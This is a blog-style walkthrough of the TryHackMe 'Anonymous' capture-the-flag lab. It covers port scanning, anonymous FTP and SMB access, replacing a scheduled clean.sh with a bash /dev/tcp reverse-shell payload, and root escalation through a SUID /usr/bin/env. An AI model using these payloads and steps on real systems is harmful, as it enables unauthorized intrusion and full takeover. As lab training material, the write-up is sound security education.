---
title: "Anonymous | TryHackMe WriteUp"
seoTitle: "Anonymous Lab Writeup"
datePublished: Tue Jun 25 2024 12:56:53 GMT+0000 (Coordinated Universal Time)
cuid: clxuev3g4000b08lb0qku9xeb
slug: anonymous-tryhackme-writeup
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1719320053409/20b4c85e-337d-47f0-9a9f-57ae6f5dcbc6.png
tags: cybersecurity, penetration-testing, cyber, cybersecurity-1, tryhackme, writeup, cybersec, red-teaming, ctf-writeup, cyber-2, tryhackme-walkthrough, tryhackmewalkthrough

---

This is a beginner-level room in TryHackMe that uses an FTP login to retrieve files, bash scripting to insert a payload and SUID binaries to privilege escalate. This guide will give you context on how to go about the room.

### Enumeration

We use Nmap here to scan for open ports. I’m using the -sV -sC and -Pn commands here to give me detailed info on the target.

`sudo nmap -sC -sV -Pn <target ip>`

After the Nmap scan, we notice this,

![](https://miro.medium.com/v2/resize:fit:1400/1*MzWRK8y5fEdqdNEHZIu7Mg.png align="left")

Here we can see that FTP is open on port 21 and can be logged in using Anonymous. I decided to do that first.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318298732/88c8ca0d-2ad7-452c-8ee6-baadd84b1956.png align="left")

Ftp login

Here, I noticed there was a directory called scripts and inside it were 3 files. I decided to use the get function to import them.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318300571/55ec8013-d633-4158-a1a6-dc8b35e65d07.png align="left")

Files present in FTP login

There is a .sh file which means it runs a bash script and there also seems to be one log file and text file. However, both of them seem to not provide us with very much information. With that, I decided to open the bash file to see what it actually does.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318303168/95150e09-d828-4379-8211-a5e46eefedfa.png align="left")

Bash script from FTP login

The clean. sh script is a shell script that seems to perform log entries and delete files from the /tmp/ directory.

With that, I noticed that there was a Samba login and decided to log in using Anonymous which was successful.

`smbclient -L \\anonymous -I <Machine IP Address>`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318305343/62f6a82b-98c9-466e-95f1-160c32b8a6ef.png align="left")

Over here we can see the share on the user’s computer. This gives us one of the answers to the given questions.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318306892/fe1c02af-4c50-410e-b2cb-94cf45a59feb.png align="left")

Then I decided to use the share obtained to log in once more to see the files present.

`smbclient //<Machine IP>/<Share found>`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318308441/25f26472-59be-440b-8817-b908c7c5840d.png align="left")

Over here we can see 2 jpg files. I retrieved them and tried finding any useful information from them, but it was a dead end. It was most likely kept just to throw attackers off.

With that, I decided to go back to the script I retrieved from the FTP login. I decided to create a new bash script called clean.sh (same name) , insert a payload into the script and use the put function to push it back into the FTP server. This way I could set up a net cat listener to perhaps get a reverse shell into the system.

I decided to use this particular payload to put into the FTP login.

`bash -i >& /dev/tcp// 0>&1`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318310037/e46c54cc-3310-47ac-9251-ffc86b9d4fd5.png align="left")

With that, I decided to log back into the FTP server with Anonymous and place the file back. But before that, I set up a net cat listening in hopes I’d get a reverse shell.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318311607/f498ebbd-4131-4d8e-9491-f1af61ca3322.png align="left")

Putting the file back into the system

It turns out that approach was successful and I did get a shell back.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318313160/32131697-ac1a-4b42-9895-15cf5c818d2b.png align="left")

From here on, I found user.txt in the same directory and pasted the output in TryHackMe for the user.txt flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318315239/d7e5c32d-7f7c-4fa6-a0a8-605e655304fe.png align="left")

### Privilege Escalation

I tried using sudo -l to check the privileges of all users but since no tty was present, it failed. Then I decided to use a command to find all the SUID binaries present.

`find / -user root -perm -u=s 2>/dev/null`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318317904/da39fdcb-1bc4-4750-af10-4c6712f91069.png align="left")

Here I observed that /usr/bin/env was assigned to SUID. It meant it could be used to exploit the machine and get elevated access.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318319763/de17ceff-a98e-46b1-a4c8-b3bf4f544de9.png align="left")

I decided to search it up on GTFObins in hopes of finding an exploit.

`/usr/bin/env /bin/sh -p`

The command doesn’t elevate privilege directly. Instead, it creates a local SUID copy of the binary and runs it with upgraded privileges. When this was combined with the /bin/sh it can provide us with an upgraded shell.

Turns out that method was successful and we’ve escalated to root successfully.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318321575/7ef01e81-9764-40a3-b8d7-221f854a3b10.png align="left")

Now we just navigate to the root folder and open root.txt, copy the output and paste it into TryHackMe to get our final flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1719318322908/bfb5c5fe-bbf5-4dda-9d25-2efefbae8741.png align="left")

Successfully retrieving root.txt

And voila! With that, we’ve successfully finished the Anonymous room on TryHackMe. Honestly, this is quite an easy room and just requires a bit of strategic thinking and patience to solve. This definitely is one of my favourite rooms to exist in TryHackMe.

I hope this guide was helpful and if you have any queries, feel free to reach out to me! See you in the next one!